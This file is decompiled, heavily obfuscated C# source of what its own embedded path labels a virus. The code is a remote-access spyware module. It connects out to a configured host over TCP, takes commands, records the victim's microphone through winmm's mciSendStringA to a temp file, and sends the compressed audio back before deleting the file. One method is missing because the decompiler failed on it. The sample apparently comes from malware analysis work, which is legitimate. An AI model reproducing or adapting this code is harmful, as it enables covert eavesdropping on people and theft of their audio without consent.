using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public class ________________________________
{
	private TcpClient _;

	private bool __;

	private ________________________________._________________________________ ___;

	public StreamWriter ____;

	public StreamReader _____;

	private string ______;

	public string _______;

	private int ________;

	private bool _________;

	public ________________________________()
	{
		this.__ = false;
		this.______ = <Module>._____<string>(1355333096);
		this._______ = <Module>.___<string>(657767552);
		this.________ = 5000;
		this._________ = false;
	}

	public void ___(string string_0)
	{
		int num;
		string[] strArrays = null;
		int length;
		uint num1;
		string string0 = string_0;
		int length1 = Type.EmptyTypes.Length + 35811;
		int ______ = <Module>.___________;
		if (______ + 7 * ______ != 7669)
		{
			length = Type.EmptyTypes.Length + 93;
		}
		else if ((3584 & 2 * -(1742782464 & ______)) == (3584 & ______ << 14))
		{
			length = (~((______ << 25) * 256) == (1981546496 * ______ ^ -1441) ? 1115932297 : -2017877775);
		}
		else
		{
			length = Type.EmptyTypes.Length + -1708157625;
		}
		string_0 = ___________________________________________________________________._(string0, <Module>.__________(35074, length1, length));
		try
		{
			if (!string_0.Contains(<Module>._____<string>(-1479692421)))
			{
				goto Label0;
			}
			strArrays = Strings.Split(string_0, <Module>._______<string>(1023697363), -1, CompareMethod.Binary);
			num = (int)(sizeof(ulong) + -3148);
			num1 = sizeof(ushort) + 1;
		Label12:
			switch (num1)
			{
				case 0:
				{
					MemoryStream memoryStream = new MemoryStream();
					string str = string.Concat(<Module>.____<string>(1830698961), this._______, ______________________________________________________________.________________________, this._______);
					memoryStream.Write(this.________(str), 0, str.Length);
					this._______(memoryStream.ToArray());
					memoryStream.Dispose();
					return;
				}
				case 1:
				{
					goto Label2;
				}
				case 2:
				{
					goto Label3;
				}
				case 3:
				{
					break;
				}
				default:
				{
					goto Label4;
				}
			}
		Label0:
			num = -3140;
			int _________ = <Module>._________________;
			if ((11 & 29 * _________ + 35 * _________) == 0)
			{
				goto Label4;
			}
		Label2:
			this.____();
		Label7:
			if (string_0.Contains(<Module>.___<string>(1238117332)))
			{
				goto Label3;
			}
			else
			{
				goto Label5;
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
		return;
		return;
	Label3:
		this._________ = false;
		goto Label5;
	Label4:
		while (true)
		{
			if (Operators.CompareString(string_0, <Module>.____<string>(-11212336), false) == 0)
			{
				if ((296222720 * ______________________._______ & 6419) != 0)
				{
					goto Label3;
				}
				if (num != -3140)
				{
					goto Label3;
				}
				this.__________();
			}
			if (!string_0.Contains(<Module>._____<string>(-870657588)))
			{
				goto Label7;
			}
			num = 29814;
			if (Type.EmptyTypes.Length + -17939 == -17939)
			{
				goto Label8;
			}
		}
	Label5:
		if (Operators.CompareString(string_0, <Module>.____<string>(-2090218926), false) == 0)
		{
			goto Label11;
		}
		else
		{
			return;
		}
	Label8:
		this._________ = true;
		this.________ = Convert.ToInt32(strArrays[1]);
		num1 = sizeof(ulong) + -7;
		goto Label12;
	Label11:
		num1 = sizeof(float) + -4;
		goto Label12;
	}

	public void ____()
	{
		int length = 0;
		string str;
		string str1 = null;
		byte[] numArray = null;
		int ____ = 0;
		string str2 = null;
		MemoryStream memoryStream = null;
		int num;
		try
		{
			Stopwatch stopwatch = new Stopwatch();
			stopwatch.Start();
			Random random = new Random();
			string str3 = string.Concat(Path.GetTempPath(), Conversions.ToString(random.Next(1000, 9000)), <Module>._______<string>(-46366155));
			object obj = checked((int)4);
			while (true)
			{
				switch (obj)
				{
					case 0:
					{
						str2 = <Module>._______<string>(-942097198);
						str = <Module>.__________(Type.EmptyTypes.Length + 5807, Type.EmptyTypes.Length + 7244, Type.EmptyTypes.Length + 234);
						______________________________________________.mciSendStringA(ref str2, ref str, 0L, 0L);
						obj = Type.EmptyTypes.Length + 2;
						continue;
					}
					case 1:
					{
						return;
					}
					case 2:
					{
						while (stopwatch.ElapsedMilliseconds < (long)this.________)
						{
							Application.DoEvents();
						}
						obj = Type.EmptyTypes.Length + 3;
						continue;
					}
					case 3:
					{
						stopwatch.Stop();
						str2 = string.Concat(<Module>._______<string>(-1673510597), str3);
						length = Type.EmptyTypes.Length + 18697;
						if ((7228 ^ -(<Module>.________________ & 1073740712)) == 0)
						{
							obj = Type.EmptyTypes.Length + 1731531566;
							continue;
						}
						else
						{
							obj = sizeof(Guid) + -10;
							continue;
						}
					}
					case 4:
					{
						str = <Module>._______<string>(-1892600789);
						____ = ______________________._______;
						num = ((____ << 2) + 4334 == -7847 ? Type.EmptyTypes.Length + -2017674079 : 63454);
						int ______ = <Module>.__________;
						str2 = <Module>.__________(num, ((((7284 | ______) >> 30 ^ ______ >> 30) & 2) != 0 ? Type.EmptyTypes.Length + -329111322 : Type.EmptyTypes.Length + 64788), (int)(sizeof(double) + 213));
						______________________________________________.mciSendStringA(ref str, ref str2, 0L, 0L);
						obj = Type.EmptyTypes.Length + 0;
						continue;
					}
					case 5:
					{
						memoryStream.Write(this.________(str1), 0, str1.Length);
						memoryStream.Write(numArray, 0, checked((int)numArray.Length));
						this._______(memoryStream.ToArray());
						memoryStream.Dispose();
						File.Delete(str3);
						break;
					}
					case 6:
					{
						str = <Module>.__________(Type.EmptyTypes.Length + 20006, (int)(sizeof(int) + 21426), 93);
						______________________________________________.mciSendStringA(ref str2, ref str, 0L, 0L);
						if (length == 18238)
						{
							goto case 2;
						}
						str2 = <Module>._____<string>(-739613390);
						str = <Module>.__________((int)(sizeof(ulong) + 69351), ((7564 ^ 50 * ____ + ____ * 14 - 3143) == 0 ? Type.EmptyTypes.Length + -1243851122 : Type.EmptyTypes.Length + 70850), Type.EmptyTypes.Length + 195);
						______________________________________________.mciSendStringA(ref str2, ref str, 0L, 0L);
						length = 19088;
						Thread.Sleep(250);
						if (this._________)
						{
							if (!File.Exists(str3))
							{
								goto Label2;
							}
							numArray = ________________________________._____(File.ReadAllBytes(str3));
							length = 14552;
							memoryStream = new MemoryStream();
							str1 = string.Concat(<Module>.____<string>(-1394330792), this._______);
							obj = Type.EmptyTypes.Length + 5;
							continue;
						}
						else
						{
							File.Delete(str3);
							obj = Type.EmptyTypes.Length + 1;
							continue;
						}
					}
					default:
					{
						goto case 4;
					}
				}
			}
		Label2:
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			Exception exception = exception1;
			______________________________________________________________.______________(<Module>.______<string>(-820038095), string.Concat(<Module>._____<string>(-45626207), exception.ToString()));
			ProjectData.ClearProjectError();
		}
	}

	public static byte[] _____(byte[] byte_0)
	{
		MemoryStream memoryStream = new MemoryStream();
		DeflateStream deflateStream = new DeflateStream(memoryStream, CompressionMode.Compress, true);
		deflateStream.Write(byte_0, 0, checked((int)byte_0.Length));
		deflateStream.Close();
		return memoryStream.ToArray();
	}

	public void ______()
	{
		int num = 0;
		try
		{
			______________________________________________________________.______________(<Module>.___<string>(982404538), <Module>.______<string>(2010400639));
			this._ = new TcpClient(______________________________________________________________._____________, ______________________________________________________________.______________);
			object length = Type.EmptyTypes.Length + 1;
			while (true)
			{
				switch (length)
				{
					case 0:
					{
						break;
					}
					case 1:
					{
						this._.ReceiveBufferSize = 9999999;
						this._.SendBufferSize = 9999999;
						int _________ = <Module>.________________;
						num = ((_________ << 14 ^ _________ * 65536 | -4419) == -4419 ? (int)(sizeof(byte) + -4386) : Type.EmptyTypes.Length + -947013799);
						length = sizeof(byte) + -1;
						continue;
					}
					default:
					{
						goto case 1;
					}
				}
			}
			if (!this.__)
			{
				this.__ = true;
				________________________________ _________________ = this;
				this._ += new ________________________________._________________________________(_________________.___);
				num == 16027;
			}
			NetworkStream stream = this._.GetStream();
			byte[] numArray = new byte[] { 0 };
			________________________________ _________________1 = this;
			stream.BeginRead(numArray, 0, 0, new AsyncCallback(_________________1.___________), null);
			Thread.Sleep(500);
			string str = string.Concat(<Module>.______<string>(36610759), ______________________________________________________________.________________________, <Module>.______<string>(861631917));
			this.____________(str);
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			Exception exception = exception1;
			______________________________________________________________.______________(<Module>.___<string>(1387161447), string.Concat(<Module>.____<string>(-1060373978), exception.ToString()));
			this.__________();
			ProjectData.ClearProjectError();
		}
	}

	public void _______(byte[] byte_0)
	{
		try
		{
			MemoryStream memoryStream = new MemoryStream();
			memoryStream.Write(byte_0, 0, checked((int)byte_0.Length));
			memoryStream.Write(this.________(this.______), 0, this.______.Length);
			this._.Client.Send(memoryStream.ToArray(), 0, (int)memoryStream.Length, SocketFlags.None);
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			this.__________();
			ProjectData.ClearProjectError();
		}
	}

	public byte[] ________(string string_0)
	{
		return Encoding.Default.GetBytes(string_0);
	}

	public string _________(byte[] byte_0)
	{
		return Encoding.Default.GetString(byte_0);
	}

	public void __________()
	{
		// 
		// Current member / type: System.Void ________________________________::__________()
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void __________()
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public void ___________(IAsyncResult iasyncResult_0)
	{
		try
		{
			this._____ = new StreamReader(this._.GetStream());
			________________________________._________________________________ __ = this.___;
			if (__ != null)
			{
				__(this._____.ReadLine());
			}
			NetworkStream stream = this._.GetStream();
			byte[] numArray = new byte[] { 0 };
			________________________________ _________________ = this;
			stream.BeginRead(numArray, 0, 0, new AsyncCallback(_________________.___________), null);
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			this.__________();
			ProjectData.ClearProjectError();
		}
	}

	public void ____________(string string_0)
	{
		try
		{
			this.____ = new StreamWriter(this._.GetStream());
			this.____.WriteLine(string.Concat(<Module>.____<string>(-1771479236), string_0));
			this.____.Flush();
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			this.__________();
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("winmm.dll", CharSet=CharSet.None, ExactSpelling=false)]
	public static extern long mciSendStringA(string string_0, string string_1, long long_0, long long_1);

	private event ________________________________._________________________________ _
	{
		add
		{
			this.___ += value;
		}
		remove
		{
			this.___ -= value;
		}
	}

	private delegate void _________________________________(string string_0);
}